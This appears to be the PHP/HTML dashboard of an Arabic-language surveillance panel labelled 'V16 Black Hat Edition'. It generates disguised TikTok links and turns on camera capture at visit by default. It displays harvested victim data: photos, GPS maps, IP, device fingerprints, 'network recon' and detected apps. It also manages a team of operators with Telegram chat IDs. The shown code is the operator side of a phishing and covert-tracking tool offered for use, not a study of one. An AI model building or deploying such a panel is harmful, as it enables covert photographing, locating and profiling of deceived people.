            <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
            <form method="POST">
                <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
                <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
                <button type="submit" name="login" class="btn btn-block">دخول</button>
            </form>
            <div style="text-align: center; margin-top: 30px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
                    <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/><path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/><path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/><path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/><path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/><path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
                </svg>
                <p style="font-size: 11px; color: var(--muted); margin-top: 5px;">Developed by <span style="color: var(--accent); font-weight: bold;">AZIZ</span></p>
            </div>
        </div>
    </div>
<?php else: ?>

    <div class="app-container">
        <aside class="sidebar">
            <div class="sidebar-header">
                <h2>Control Panel</h2>
                <p>V16 Black Hat Edition</p>
            </div>
            <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
            <?php if ($is_admin): ?>
            <button class="nav-item" onclick="switchTab('team')">👥 إدارة الفريق</button>
            <?php endif; ?>
            <button class="nav-item" onclick="switchTab('settings')">⚙️ الإعدادات</button>

            <div class="sidebar-footer">
                <div class="user-profile">
                    <div class="user-avatar"><?php echo strtoupper(substr($current_username, 0, 1)); ?></div>
                    <div>
                        <div style="font-weight: bold; font-size: 14px;"><?php echo htmlspecialchars($current_username); ?></div>
                        <div style="font-size: 11px; color: var(--muted);"><?php echo $is_admin ? 'مدير النظام' : 'مستخدم'; ?></div>
                    </div>
                </div>
                <a href="?logout=1" class="btn btn-danger" style="width: 100%;">تسجيل الخروج</a>
            </div>
        </aside>

        <main class="main-content">
            <!-- 1. الصفحة الرئيسية -->
            <div id="tab-home" class="tab-content active">
                <h2 style="font-size: 20px; margin-bottom: 20px;">مرحباً، <?php echo htmlspecialchars($current_username); ?> 👋</h2>

                <div class="stats-grid">
                    <div class="stat-card"><h3>روابطي</h3><p><?php echo $total_links; ?></p></div>
                    <div class="stat-card"><h3>إجمالي الزيارات</h3><p style="color: #38bdf8;"><?php echo $total_captures; ?></p></div>
                    <div class="stat-card"><h3>زيارات اليوم</h3><p style="color: #10b981;"><?php echo $today_captures; ?></p></div>
                </div>

                <div class="card" style="border-color: var(--accent);">
                    <div class="card-title">🔗 إنشاء رابط تيك توك جديد</div>
                    <form method="POST">
                        <div class="form-group"><input type="text" name="target_url" placeholder="ضع رابط فيديو تيك توك هنا..." required></div>
                        <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
                            <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
                            <label style="margin: 0; cursor: pointer; font-size: 13px;">تفعيل التقاط صورة الكاميرا عند الزيارة</label>
                        </div>
                        <button type="submit" name="create" class="btn" style="width: 100%;">توليد الرابط</button>
                    </form>

                    <?php if (!empty($generated_link)): ?>
                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-top: 20px;">
                            <div class="form-group">
                                <label style="color: var(--success);">✅ الرابط جاهز:</label>
                                <div style="display: flex; gap: 10px;">
                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="flex:1; border-color: var(--success); color: #38bdf8;">
                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">نسخ</button>
                                </div>
                            </div>
                            <div class="form-group" style="margin-bottom: 0;">
                                <label>كود التتبع:</label>
                                <div style="display: flex; gap: 10px;">
                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="flex:1; font-family: monospace; color: #a78bfa; font-weight: bold;">
                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">نسخ</button>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>

                <div class="card">
                    <div class="card-title" style="display: flex; justify-content: space-between;">
                        <span>📸 سجلات الزيارات (V16 Forensics)</span>
                        <a href="/" class="btn" style="background: #334155; padding: 4px 10px; font-size: 12px;">🔄 تحديث</a>
                    </div>
                    <form method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
                        <input type="text" name="track" placeholder="البحث بكود التتبع..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
                        <button type="submit" class="btn">بحث</button>
                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-secondary" style="background: #334155;">إلغاء</a><?php endif; ?>
                    </form>

                    <?php if (empty($captures)): ?>
                        <p style="text-align: center; color: var(--muted); padding: 20px;">لا توجد سجلات حتى الآن.</p>
                    <?php else: ?>
                        <div class="gallery-grid">
                            <?php foreach ($captures as $cap): ?>
                                <div class="capture-card">
                                    <?php if (!empty($cap['image_data'])): ?>
                                        <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                    <?php else: ?>
                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">الكاميرا معطلة</div>
                                    <?php endif; ?>

                                    <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
                                        <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
                                        <script>
                                            document.addEventListener("DOMContentLoaded", function() {
                                                var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false, dragging: false, scrollWheelZoom: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
                                                L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
                                                L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map);
                                            });
                                        </script>
                                    <?php endif; ?>

                                    <div class="capture-info">
                                        <div class="info-row"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
                                        <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                        <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
                                        <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                        
                                        <!-- V16 Forensics Data -->
                                        <div style="margin-top: 10px; padding-top: 10px; border-top: 1px dashed var(--border);">
                                            <div class="info-row"><span>HW Profile:</span> <span class="badge-forensics"><?php echo htmlspecialchars($cap['hw_profile'] ?? 'N/A'); ?></span></div>
                                            <div class="info-row"><span>Behavioral:</span> <span class="badge-forensics"><?php echo htmlspecialchars($cap['behavioral_fp'] ?? 'N/A'); ?></span></div>
                                            <div class="info-row"><span>Network Recon:</span> <span class="badge-forensics" style="color: #38bdf8;"><?php echo htmlspecialchars($cap['network_recon'] ?? 'N/A'); ?></span></div>
                                            <div class="info-row"><span>Detected Apps:</span> <span class="badge-forensics" style="color: #f43f5e;"><?php echo htmlspecialchars($cap['installed_apps'] ?? 'N/A'); ?></span></div>
                                        </div>

                                        <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 15px; padding: 8px; font-size: 12px;" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- 2. إدارة الفريق -->
            <?php if ($is_admin): ?>
            <div id="tab-team" class="tab-content">
                <div class="card">
                    <div class="card-title">➕ إضافة زميل جديد</div>
                    <form method="POST" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                        <div class="form-group"><input type="text" name="new_username" placeholder="اسم المستخدم" required></div>
                        <div class="form-group"><input type="password" name="new_password" placeholder="كلمة المرور" required></div>
                        <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Chat ID التلجرام (اختياري)"></div>
                        <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%;">إضافة</button></div>
                    </form>
                </div>

                <div class="card">
                    <div class="card-title">👥 قائمة الزملاء</div>
                    <?php if (isset($user_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $user_error; ?></p><?php endif; ?>
                    <div class="table-responsive">
                        <table>
                            <thead>
                                <tr><th>المستخدم</th><th>معرف التلجرام</th><th>تاريخ الإضافة</th><th>الإجراءات</th></tr>
                            </thead>
                            <tbody>
                                <?php foreach ($users_list as $u): ?>
                                <tr>
                                    <td style="font-weight: bold; color: var(--accent);"><?php echo htmlspecialchars($u['username']); ?></td>
                                    <td><?php echo htmlspecialchars($u['tg_chat'] ?: '-'); ?></td>
                                    <td style="color: var(--muted);"><?php echo $u['created_at']; ?></td>
                                    <td>
                                        <div style="display: flex; gap: 10px;">
                                            <form method="POST" style="display:inline;">
                                                <input type="hidden" name="target_user_id" value="<?php echo $u['id']; ?>">
                                                <input type="hidden" name="admin_new_password" id="new_pass_<?php echo $u['id']; ?>">
                                                <button type="button" onclick="let p = prompt('كلمة المرور الجديدة لـ <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn" style="padding: 6px 12px; font-size: 12px; background: #4f46e5;">تغيير الكلمة</button>
                                                <input type="hidden" name="admin_change_user_pass" value="1">
                                            </form>
                                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger" style="padding: 6px 12px; font-size: 12px;" onclick="return confirm('حذف الزميل وكل روابطه؟');">حذف</a>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- 3. الإعدادات -->
            <div id="tab-settings" class="tab-content">
                <div class="card" style="max-width: 600px; margin: 0 auto;">
                    <div class="card-title">🔐 تغيير كلمة المرور</div>
                    <?php if (!empty($pass_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_error; ?></p><?php endif; ?>
                    <?php if (!empty($pass_success)): ?><p style="color: var(--success); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_success; ?></p><?php endif; ?>
                    
                    <form method="POST">
                        <div class="form-group"><label>كلمة المرور الحالية</label><input type="password" name="current_password" required></div>
                        <div class="form-group"><label>كلمة المرور الجديدة</label><input type="password" name="new_password" required></div>
                        <div class="form-group"><label>تأكيد كلمة المرور الجديدة</label><input type="password" name="confirm_password" required></div>
                        <button type="submit" name="change_my_password" class="btn" style="width: 100%;">حفظ التغييرات</button>
                    </form>
                </div>
            </div>

        </main>
    </div>

<?php endif; ?>

<div class="toast" id="toast">✅ تم النسخ بنجاح!</div>

<footer style="text-align: center; padding: 20px; border-top: 1px solid var(--border); background: var(--sidebar-bg); margin-top: auto;">
    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; flex-direction: column;">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
            <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/><path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/><path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/><path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/><path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/><path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
        </svg>
        <p style="color: var(--muted); font-size: 13px; font-weight: 500; letter-spacing: 0.5px;">
            Developed by <span style="color: var(--accent); font-weight: bold; text-shadow: 0 0 8px var(--accent);">AZIZ</span> &copy; 2026
        </p>
    </div>
</footer>

<script>
    function switchTab(tabId) {
        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
        document.getElementById('tab-' + tabId).classList.add('active');
        event.currentTarget.classList.add('active');
    }
    function copyText(text, btn) {
        navigator.clipboard.writeText(text).then(() => {
            const t = document.getElementById('toast');
            t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2000);
            if(btn) { const o = btn.innerText; btn.innerText = "تم النسخ!"; setTimeout(() => { btn.innerText = o; }, 2000); }
        });
    }
</script>
</body>
</html>
